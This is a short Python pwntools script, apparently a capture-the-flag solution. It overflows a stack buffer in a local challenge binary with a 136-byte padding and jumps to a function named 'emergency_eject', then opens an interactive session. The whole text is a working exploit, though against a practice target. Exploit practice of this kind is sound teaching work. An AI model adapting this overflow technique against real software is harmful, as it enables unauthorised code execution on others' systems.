from pwn import *

context.binary = elf = ELF('./chall')
context.terminal = ['bash', '-c']

HOST = 'localhost'
PORT = 6767

OFFSET = 136

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

io = start()

payload = flat(
    b'A' * OFFSET,
    elf.symbols['emergency_eject']
)

io.sendlineafter(b'> ', payload)
io.interactive()